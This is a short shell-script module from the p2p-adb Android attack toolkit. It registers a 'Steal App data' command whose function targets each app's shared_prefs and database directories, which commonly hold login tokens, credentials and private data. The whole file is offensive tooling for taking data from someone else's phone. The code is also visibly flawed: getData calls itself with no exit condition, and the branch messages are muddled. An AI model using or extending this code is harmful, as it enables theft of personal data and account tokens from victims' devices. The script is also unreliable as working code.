# p2p-adb
# https://github.com/kosborn/p2p-adb/
# @theKos
# kyle@kyleosborn.com


# Registering command
registerCommand "1:getData:Steal App data"


getData(){

	if [ $ISROOT -ge 2  ]; then 
		DATAPATH="/sdcard/Android/data/*/{shared_prefs,databases}/"
		echo 'We are user shell!'
		echo 'Whoever, we can grab contents for /sdcard/Android/data'
		getData "$DATAPATH"
	elif [ $ISROOT -le 1 ]; then
		DATAPATH="/data/data/*/{shared_prefs,databases}/"
		echo 'We are root...'
		getData "$DATAPATH"
	fi

}
